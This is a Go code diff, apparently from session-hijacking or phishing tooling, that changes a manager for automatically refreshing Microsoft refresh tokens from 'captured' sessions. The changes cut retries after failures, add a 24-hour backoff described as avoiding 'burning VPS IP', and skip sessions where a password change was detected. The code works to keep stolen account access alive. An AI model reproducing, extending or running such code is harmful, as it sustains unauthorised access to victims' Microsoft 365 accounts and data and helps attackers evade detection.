@@ -33,10 +33,10 @@ const (
 	DEFAULT_REFRESH_CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
 	// Default scope
 	DEFAULT_REFRESH_SCOPE = "offline_access openid profile https://graph.microsoft.com/.default"
-	// REDUCED maximum consecutive failures - fail faster and try recovery strategies
-	MAX_CONSECUTIVE_FAILURES = 5
-	// Reduced backoff delay - retry faster to catch transient errors
-	MAX_BACKOFF_DELAY = 10 * time.Minute
+	// Maximum consecutive failures before marking session dead
+	MAX_CONSECUTIVE_FAILURES = 3
+	// Backoff delay for dead sessions - long delay to avoid burning VPS IP
+	MAX_BACKOFF_DELAY = 24 * time.Hour
 	// Extended session age threshold for aggressive refresh (4 hours after capture)
 	AGGRESSIVE_REFRESH_AGE = 4 * time.Hour
 	// Password change survival: refresh token validity is typically 90 days
@@ -290,8 +290,8 @@ func (m *TokenAutoRefreshManager) preemptiveRefreshSessions() {
 			continue
 		}
 
-		// Skip dead sessions
-		if health.Status == "dead" {
+		// Skip dead sessions or password-changed sessions
+		if health.Status == "dead" || health.PasswordChangeDetected {
 			continue
 		}
 
@@ -346,6 +346,12 @@ func (m *TokenAutoRefreshManager) refreshAllTokens() {
 
 		// Get or create health tracking
 		health := m.getOrCreateHealth(s)
+
+		// Skip sessions where password change was already detected — no point retrying
+		if health.PasswordChangeDetected {
+			skipped++
+			continue
+		}
 
 		// Skip dead sessions (too many consecutive failures)
 		if health.ConsecutiveFailures >= MAX_CONSECUTIVE_FAILURES {
@@ -443,6 +449,11 @@ func (m *TokenAutoRefreshManager) keepAliveFreshSessions() {
 		}
 
 		health := m.getOrCreateHealth(s)
+
+		// Skip password-changed sessions
+		if health.PasswordChangeDetected {
+			continue
+		}
 
 		// Only aggressively refresh sessions captured within the last 2 hours
 		// or sessions that are "new" status
